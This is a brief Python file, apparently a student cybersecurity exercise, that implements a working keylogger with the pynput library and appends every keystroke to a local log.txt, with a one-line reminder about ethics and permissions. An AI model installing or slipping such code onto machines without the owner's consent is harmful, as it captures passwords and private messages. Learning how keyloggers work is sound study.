# PRODIGY_CS_04
#Simple Keylogger  Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers
from pynput.keyboard import Listener

def writetofile(key):
    keydata=str(key)
    with open("log.txt", "a") as f:
        if hasattr(key, 'char'):  # Normal character key
            f.write(key.char)
        elif key == key.space:  # Spacebar
            f.write(' ')
        elif key == key.enter:  # Enter key
            f.write('\n')
        else:  # Other special keys (e.g., Ctrl, Shift, etc.)
            f.write('[' + str(key) + ']')


with Listener(on_press=writetofile) as l:
    l.join()

